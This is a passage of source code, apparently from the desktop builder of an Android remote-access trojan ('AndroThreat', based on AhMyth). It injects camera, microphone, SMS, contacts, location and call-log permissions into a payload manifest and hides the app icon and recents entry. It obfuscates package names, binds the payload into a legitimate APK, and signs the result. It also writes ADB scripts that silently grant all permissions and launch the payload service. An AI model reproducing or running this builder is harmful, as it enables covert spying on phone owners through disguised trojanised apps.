                                    break;
                                }
                            }
                            break;
                        }
                    }
                    
                    if (found) {
                        smaliContent = lines.join('\n');
                        continue;
                    }
                }
                
                // Pattern 3: Try to find any const/4 followed by sput-boolean for this field (anywhere in file)
                const sputPattern = new RegExp(`(const/4\\s+v\\d+,\\s*)0x[01]([^\\n]*\\n[^\\n]*sput-boolean[^\\n]*->${fieldName}:Z)`, 'g');
                if (sputPattern.test(smaliContent)) {
                    smaliContent = smaliContent.replace(sputPattern, `$1${boolValue}$2`);
                    found = true;
                    modifiedCount++;
                    delayedLog(`[✓] Set ${fieldName} = ${boolStr} (pattern match)`, CONSTANTS.logStatus.SUCCESS);
                    continue;
                }
                
                if (!found) {
                    delayedLog(`[⚠] Could not find ${fieldName} in StealthConfig.smali`, CONSTANTS.logStatus.WARNING);
                }
            }
            
            // Write the modified content back
            if (modifiedCount > 0) {
                await fs.promises.writeFile(stealthConfigPath, smaliContent, 'utf8');
                delayedLog(`[✓] StealthConfig.smali updated successfully (${modifiedCount} fields modified)`, CONSTANTS.logStatus.SUCCESS);
            } else {
                delayedLog('[⚠] No StealthConfig fields were modified', CONSTANTS.logStatus.WARNING);
            }
            
        } catch (error) {
            delayedLog(`[✗] Error modifying StealthConfig.smali: ${error.message}`, CONSTANTS.logStatus.FAIL);
            throw error;
        }
    }

    // UNCOMMENT ORIGINAL CODE IF PROBLEMS ARISE.
    $appCtrl.GenerateApk = async (apkFolder) => {
        // Apply obfuscation if enabled
        if ($appCtrl.obfuscationOptions && (
            $appCtrl.obfuscationOptions.randomizePackage ||
            $appCtrl.obfuscationOptions.randomizeAppName ||
            $appCtrl.obfuscationOptions.injectJunk ||
            $appCtrl.obfuscationOptions.addMetadata
        )) {
            try {
                delayedLog('[→] Applying obfuscation...', CONSTANTS.logStatus.INFO);
                
                const obfuscationResult = await obfuscator.obfuscate(apkFolder, {
                    randomizePackage: $appCtrl.obfuscationOptions.randomizePackage,
                    randomizeAppName: $appCtrl.obfuscationOptions.randomizeAppName,
                    randomizeVersion: $appCtrl.obfuscationOptions.randomizeVersion,
                    injectJunk: $appCtrl.obfuscationOptions.injectJunk,
                    junkCount: 10,
                    addMetadata: $appCtrl.obfuscationOptions.addMetadata,
                    customPackage: $appCtrl.obfuscationOptions.customPackage,
                    customAppName: $appCtrl.obfuscationOptions.customAppName
                });
                
                if (obfuscationResult.success) {
                    obfuscationResult.changes.forEach(change => {
                        delayedLog(`[✓] ${change}`, CONSTANTS.logStatus.SUCCESS);
                    });
                    if (obfuscationResult.newPackageName) {
                        delayedLog(`[ℹ] New package: ${obfuscationResult.newPackageName}`, CONSTANTS.logStatus.INFO);
                    }
                    if (obfuscationResult.newAppName) {
                        delayedLog(`[ℹ] New app name: ${obfuscationResult.newAppName}`, CONSTANTS.logStatus.INFO);
                    }
                } else {
                    delayedLog(`[⚠] Obfuscation warning: ${obfuscationResult.error}`, CONSTANTS.logStatus.WARNING);
                }
            } catch (obfError) {
                delayedLog(`[⚠] Obfuscation error: ${obfError.message}`, CONSTANTS.logStatus.WARNING);
            }
        }
        
        if (!$appCtrl.bindApk.enable) {
            var checkBoxofCamera = document.getElementById("Permissions1");
            var checkBoxofStorage = document.getElementById("Permissions2");
            var checkBoxofMic = document.getElementById("Permissions3");
            var checkBoxofLocation = document.getElementById("Permissions4");
            var checkBoxofContacts = document.getElementById("Permissions5");
            var checkBoxofSms = document.getElementById("Permissions6");
            var checkBoxofCallsLogs = document.getElementById("Permissions7");

            // default permissions for the payload
            const permissions = CONSTANTS.permissions;

            // Create an array to store the selected permissions
            var selectedPermissions = [];

            // Check each checkbox and add the corresponding permission to the selectedPermissions array
            if (checkBoxofCamera.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
            }
            if (checkBoxofStorage.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
            }
            if (checkBoxofMic.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
            }
            if (checkBoxofLocation.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
            }
            if (checkBoxofContacts.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
            }
            if (checkBoxofSms.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
            }
            if (checkBoxofCallsLogs.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
            }

            // If all checkboxes are checked, set selectedPermissions to the permissions array from CONSTANTS
            if (
                checkBoxofCamera.checked &&
                checkBoxofStorage.checked &&
                checkBoxofMic.checked &&
                checkBoxofLocation.checked &&
                checkBoxofContacts.checked &&
                checkBoxofSms.checked &&
                checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            // If all checkboxes are unchecked, set selectedPermissions to an empty array
            if (
                !checkBoxofCamera.checked &&
                !checkBoxofStorage.checked &&
                !checkBoxofMic.checked &&
                !checkBoxofLocation.checked &&
                !checkBoxofContacts.checked &&
                !checkBoxofSms.checked &&
                !checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            try {
                delayedLog('[→] Reading payload manifest file...', CONSTANTS.logStatus.INFO);
                const data = await fs.promises.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'), 'utf8');

                delayedLog('[→] Parsing manifest XML data...', CONSTANTS.logStatus.INFO);
                const parsedData = await new Promise((resolve, reject) => {
                    xml2js.parseString(data, (parseError, parsedData) => {
                        if (parseError) {
                            reject(parseError);
                        } else {
                            resolve(parsedData);
                        }
                    });
                });

                delayedLog('[→] Injecting selected permissions...', CONSTANTS.logStatus.INFO);
                parsedData.manifest['uses-permission'] = [];
                parsedData.manifest['uses-feature'] = [];

                // Add new permissions and features based on selectedPermissions
                selectedPermissions.forEach(permission => {
                    if (permission === 'android.hardware.camera') {
                        parsedData.manifest['uses-feature'].push({
                            $: {
                                'android:name': 'android.hardware.camera'
                            }
                        });
                    }

                    if (permission === 'android.hardware.camera.autofocus') {
                        parsedData.manifest['uses-feature'].push({
                            $: {
                                'android:name': 'android.hardware.camera.autofocus'
                            }
                        });
                    }

                    if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                        parsedData.manifest['uses-permission'].push({
                            $: {
                                'android:name': permission
                            }
                        });
                    }
                });

                // Apply stealth options
                if ($appCtrl.stealthOptions) {
                    delayedLog('[→] Applying stealth options...', CONSTANTS.logStatus.INFO);
                    
                    // Find the MainActivity in the manifest
                    if (parsedData.manifest.application && parsedData.manifest.application[0]) {
                        const app = parsedData.manifest.application[0];
                        
                        // Hide from recents - add excludeFromRecents to all activities
                        if ($appCtrl.stealthOptions.hideFromRecents && app.activity) {
                            app.activity.forEach(activity => {
                                activity.$['android:excludeFromRecents'] = 'true';
                                activity.$['android:noHistory'] = 'true';
                            });
                            delayedLog('[✓] Hide from recents enabled', CONSTANTS.logStatus.SUCCESS);
                        }
                        
                        // Hide app icon - remove LAUNCHER category from MainActivity
                        if ($appCtrl.stealthOptions.hideIcon && app.activity) {
                            app.activity.forEach(activity => {
                                if (activity['intent-filter']) {
                                    activity['intent-filter'].forEach(filter => {
                                        if (filter.category) {
                                            // Remove LAUNCHER category
                                            filter.category = filter.category.filter(cat => 
                                                cat.$['android:name'] !== 'android.intent.category.LAUNCHER'
                                            );
                                            // Keep only DEFAULT category or add it
                                            if (filter.category.length === 0) {
                                                filter.category = [{ $: { 'android:name': 'android.intent.category.DEFAULT' } }];
                                            }
                                        }
                                    });
                                }
                            });
                            delayedLog('[✓] App icon hidden from launcher', CONSTANTS.logStatus.SUCCESS);
                        }
                    }
                }

                // Convert the parsed data back to XML
                const builder = new xml2js.Builder();
                const updatedData = builder.buildObject(parsedData);
                await fs.promises.writeFile(
                    dir.join(CONSTANTS.ahmythApkFolderPath,
                        'AndroidManifest.xml'),
                    updatedData,
                    'utf8'
                );

            } catch (error) {
                delayedLog('[✗] Error processing payload manifest!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error);
                delayedLog(`[ℹ] Error details saved to: ${logPath}`, CONSTANTS.logStatus.INFO);
                return;
            }
        }
        
        // Apply stealth and permission options to StealthConfig.smali (for both bound and non-bound APKs)
        try {
            await applyStealthConfigToSmali(apkFolder);
        } catch (stealthError) {
            delayedLog(`[⚠] Warning: Could not modify StealthConfig: ${stealthError.message}`, CONSTANTS.logStatus.WARNING);
            // Continue with build even if stealth config modification fails
        }

        try {
            delayedLog('[→] Clearing Apktool framework directory...', CONSTANTS.logStatus.INFO);
            execCallback('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
                (error, stderr, stdout) => {
                    if (error) throw error;
                });
        } catch (error) {
            // Ignore the error by doing nothing
        }

        // Build the AndroThreat Payload APK
        delayedLog(`[→] Building ${CONSTANTS.apkName}...`, CONSTANTS.logStatus.INFO);
        var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath,
            CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
        execCallback(createApk,
            (error, stdout, stderr) => {
                if (error !== null) {
                    delayedLog('[✗] Build process failed!', CONSTANTS.logStatus.FAIL);
                    writeErrorLog(error, 'Building');
                    delayedLog(`[ℹ] Error details saved to: ${logPath}/Building.log`, CONSTANTS.logStatus.INFO);
                    return;
                }

                delayedLog(`[→] Signing ${CONSTANTS.apkName}...`, CONSTANTS.logStatus.INFO);
                var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
                execCallback(signApk, (error, stdout, stderr) => {
                    if (error !== null) {
                        delayedLog('[✗] Signing process failed!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Signing');
                        delayedLog(`[ℹ] Error details saved to: ${logPath}/Signing.log`, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
                        if (err) throw err;

                        delayedLog('[✓] Payload built successfully!', CONSTANTS.logStatus.SUCCESS);
                        const signedApkPath = dir.join(outputPath, CONSTANTS.signedApkName);
                        delayedLog('[ℹ] Output location:', CONSTANTS.logStatus.INFO);
                        delayedLog(`    └─ ${signedApkPath}`, CONSTANTS.logStatus.INFO);
                        // Store the output path for easy access
                        $appCtrl.lastBuiltApkPath = signedApkPath;
                        $appCtrl.lastOutputFolder = outputPath;
                        
                        // Offer to open the output folder automatically
                        try {
                            delayedLog('[→] Opening output folder...', CONSTANTS.logStatus.INFO);
                            if (shell && shell.showItemInFolder) {
                                shell.showItemInFolder(signedApkPath);
                            }
                        } catch (e) {
                            console.warn('Failed to open output folder:', e);
                        }
                        
                        // Generate ADB script for silent permissions if enabled
                        if ($appCtrl.silentPermOptions && $appCtrl.silentPermOptions.generateAdbScript) {
                            generateAdbPermissionScript(outputPath);
                        }
                        
                        delayedLog('');

                        fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                            if (err) throw err;
                        });
                    });
                });
            });
    };
    
    // Generate ADB script to grant all permissions silently
    function generateAdbPermissionScript(outputPath) {
        const packageName = 'ahmyth.mine.king.ahmyth';
        const permissions = CONSTANTS.permissions.filter(p => 
            !p.startsWith('android.hardware.') && 
            p.startsWith('android.permission.')
        );
        
        // Windows batch script
        let batScript = `@echo off
echo ===== AndroThreat Silent Permission Granter =====
echo.
echo This script will grant all permissions to the AndroThreat payload.
echo Make sure the device is connected via ADB and USB debugging is enabled.
echo.

set PACKAGE=${packageName}

echo [*] Checking device connection...
adb devices
echo.

echo [*] Installing APK (if needed)...
adb install -r -g "${CONSTANTS.signedApkName}"
echo.

echo [*] Granting permissions...
`;
        
        permissions.forEach(perm => {
            batScript += `adb shell pm grant %PACKAGE% ${perm} 2>nul\n`;
        });
        
        batScript += `
echo.
echo [*] Granting special permissions...
adb shell appops set %PACKAGE% SYSTEM_ALERT_WINDOW allow 2>nul
adb shell appops set %PACKAGE% GET_USAGE_STATS allow 2>nul
adb shell appops set %PACKAGE% WRITE_SETTINGS allow 2>nul
adb shell appops set %PACKAGE% REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow 2>nul
adb shell appops set %PACKAGE% MANAGE_EXTERNAL_STORAGE allow 2>nul
adb shell appops set %PACKAGE% RUN_IN_BACKGROUND allow 2>nul
adb shell appops set %PACKAGE% RUN_ANY_IN_BACKGROUND allow 2>nul

echo.
echo [*] Starting the app...
adb shell am start -n %PACKAGE%/%PACKAGE%.MainActivity 2>nul
adb shell am startservice %PACKAGE%/%PACKAGE%.MainService 2>nul

echo.
echo [+] All permissions granted successfully!
echo [!] Note: Some permissions may require manual approval on Android 10+
pause`;
        
        // Unix/Linux shell script
        let shScript = `#!/bin/bash
echo "===== AndroThreat Silent Permission Granter ====="
echo ""
echo "This script will grant all permissions to the AndroThreat payload."
echo "Make sure the device is connected via ADB and USB debugging is enabled."
echo ""

PACKAGE="${packageName}"

echo "[*] Checking device connection..."
adb devices
echo ""

echo "[*] Installing APK (if needed)..."
adb install -r -g "${CONSTANTS.signedApkName}"
echo ""

echo "[*] Granting permissions..."
`;
        
        permissions.forEach(perm => {
            shScript += `adb shell pm grant $PACKAGE ${perm} 2>/dev/null\n`;
        });
        
        shScript += `
echo ""
echo "[*] Granting special permissions..."
adb shell appops set $PACKAGE SYSTEM_ALERT_WINDOW allow 2>/dev/null
adb shell appops set $PACKAGE GET_USAGE_STATS allow 2>/dev/null
adb shell appops set $PACKAGE WRITE_SETTINGS allow 2>/dev/null
adb shell appops set $PACKAGE REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow 2>/dev/null
adb shell appops set $PACKAGE MANAGE_EXTERNAL_STORAGE allow 2>/dev/null
adb shell appops set $PACKAGE RUN_IN_BACKGROUND allow 2>/dev/null
adb shell appops set $PACKAGE RUN_ANY_IN_BACKGROUND allow 2>/dev/null

echo ""
echo "[*] Starting the app..."
adb shell am start -n $PACKAGE/$PACKAGE.MainActivity 2>/dev/null
adb shell am startservice $PACKAGE/$PACKAGE.MainService 2>/dev/null

echo ""
echo "[+] All permissions granted successfully!"
echo "[!] Note: Some permissions may require manual approval on Android 10+"`;
        
        try {
            fs.writeFileSync(dir.join(outputPath, 'grant_permissions.bat'), batScript);
            fs.writeFileSync(dir.join(outputPath, 'grant_permissions.sh'), shScript);
            delayedLog('[✓] ADB permission scripts generated:', CONSTANTS.logStatus.SUCCESS);
            delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.bat')}`, CONSTANTS.logStatus.INFO);
            delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.sh')}`, CONSTANTS.logStatus.INFO);
            delayedLog(`[ℹ] Output folder: ${outputPath}`, CONSTANTS.logStatus.INFO);
        } catch (e) {
            delayedLog('[!] Failed to generate ADB scripts', CONSTANTS.logStatus.WARNING);
        }
    }

    // function to create the smali payload directory for storing ahmyth payload directories and files when binding
    $appCtrl.createPayloadDirectory = (files) => {
        var ignoreDirs = ['original',
            'res',
            'build',
            'kotlin',
            'lib',
            'assets',
            'META-INF',
            'unknown',
            'smali_assets'];
        var smaliList = files.filter((item) => item.isDirectory() && !(ignoreDirs.includes(item.name))).map((item) => item.name);
        var collator = new Intl.Collator([], {
            numeric: true
        });
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length - 1];

        if (lastSmali == "smali") {
            payloadSmaliFolder = '/smali_classes2';
            return payloadSmaliFolder;
        } else {
            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber + 1;
            var payloadSmaliFolder = '/smali_classes' + newSmaliNumber;
            return payloadSmaliFolder;
        }
    };

    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {

        delayedLog('[→] Reading decompiled application...', CONSTANTS.logStatus.INFO);
        fs.readdir(apkFolder, {
            withFileTypes: true
        }, (error, files) => {
            if (error) {
                delayedLog('[✗] Failed to read decompiled application!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog(`[ℹ] Error details saved to: ${logPath}/Reading.log`, CONSTANTS.logStatus.INFO);
                return;
            }

            const payloadSmaliFolder = $appCtrl.createPayloadDirectory(files);
            const targetPayloadFolder = dir.join(apkFolder, payloadSmaliFolder);

            delayedLog(`[→] Creating ${payloadSmaliFolder} directory...`, CONSTANTS.logStatus.INFO);
            fs.mkdir(targetPayloadFolder, {
                recursive: true
            }, (error) => {
                if (error) {
                    delayedLog(`[✗] Failed to create ${payloadSmaliFolder} directory!`, CONSTANTS.logStatus.FAIL);
                    return;
                }

                delayedLog(`[→] Copying payload files to ${payloadSmaliFolder} directory...`, CONSTANTS.logStatus.INFO);
                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), targetPayloadFolder, {
                    overwrite: true
                }, (error) => {
                    if (error) {
                        delayedLog('[✗] Copying failed!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Copying.log');
                        delayedLog(`[ℹ] Error details saved to: ${logPath}/Copying.log`, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    // Copy android directory to the smali folder in the apkFolder
                    fs.copy(dir.join(targetPayloadFolder, 'android'), dir.join(apkFolder, 'smali', 'android'), {
                        overwrite: true
                    }, (error) => {
                        if (error) {
                            delayedLog('[✗] Copying "android" directory failed!', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Copying-android.log');
                            delayedLog(`[ℹ] Error details saved to: ${logPath}/Copying-android.log`, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Copy androidx directory to the smali folder in the apkFolder
                        fs.copy(dir.join(targetPayloadFolder, 'androidx'), dir.join(apkFolder, 'smali', 'androidx'), {
                            overwrite: true
                        }, (error) => {
                            if (error) {
                                delayedLog('[✗] Copying "androidx" directory failed!', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'Copying-androidx.log');
                                delayedLog(`[ℹ] Error details saved to: ${logPath}/Copying-androidx.log`, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // Remove the original 'android' and 'androidx' directories
                            fs.rmdir(dir.join(targetPayloadFolder, 'android'), {
                                recursive: true
                            });
                            fs.rmdir(dir.join(targetPayloadFolder, 'androidx'), {
                                recursive: true
                            });

                            // Continue with APK generation
                            $appCtrl.GenerateApk(apkFolder);
                        });
                    });
                });
            });
        });
    };
});
